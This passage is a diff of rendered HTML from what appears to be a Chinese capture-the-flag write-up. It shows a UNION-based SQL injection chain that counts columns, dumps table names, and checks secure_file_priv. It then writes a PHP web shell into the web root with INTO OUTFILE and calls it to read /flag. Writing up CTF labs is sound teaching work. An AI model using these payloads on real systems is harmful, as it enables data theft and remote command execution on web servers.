-</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="c1">-- ③ 看写权限目录</span>
-</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
-</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a>
-</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a><span class="c1">-- ④ 写 shell</span>
-</span><span id="__span-58-11"><a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1">-- ① 确认列数</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="c1">-- ② 爆表</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="c1">-- ③ 看写权限目录</span>
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
+</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>
+</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a><span class="c1">-- ④ 写 shell</span>
+</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>访问：/io/C.php?0=cat /flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>访问：/io/C.php?0=cat /flag
 </span></code></pre></div>
 </details>
 <details class="note">
